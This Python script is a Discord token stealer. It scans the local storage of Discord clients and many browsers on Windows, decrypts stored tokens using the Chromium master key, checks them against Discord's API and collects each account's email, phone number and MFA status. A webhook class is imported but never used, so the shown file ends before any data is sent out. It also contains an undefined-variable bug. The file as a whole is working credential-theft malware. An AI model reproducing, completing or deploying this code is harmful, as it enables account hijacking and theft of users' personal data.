import base64
import json
import os
import re

import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData

global base_url, appdata, roaming, tokens, uids, regexp, regexp_enc
base_url = "https://discord.com/api/v9/users/@me"
appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
tokens, uids = [], []
regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

def validate_token(token: str) -> bool:
        
        r = requests.get(base_url, headers={'Authorization': token})

        if r.status_code == 200:
            print("[VALID]: "+ token)
            return True

        return False

def decrypt_val(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

def get_master_key(path: str) -> str:
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

    return master_key


def run():

    paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'NaverWhale': appdata + '\\Naver\\Naver Whale\\User Data\\Default\\Local Storage\\leveldb\\'
        }
    
    for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(roaming+f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(regexp_enc, line):
                            token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                1]), get_master_key(roaming+f'\\{_discord}\\Local State'))

                            if validate_token(token):
                                uid = requests.get(base_url, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in uids:
                                    tokens.append(token)
                                    uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(regexp, line):
                            if validate_token(token):
                                uid = requests.get(base_url, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in uids:
                                    tokens.append(token)
                                    uids.append(uid)
    for token in tokens:
        user = requests.get(
            'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        username = user['username']
        userid = user['id']
        phone = user['phone']
        email = user['email']
        is_mfa = str(user['mfa_enabled'])
        avatar = f"https://cdn.discordapp.com/avatars/{userid}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{userid}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
                 
        

        
        



if __name__ == "__main__":
    run()
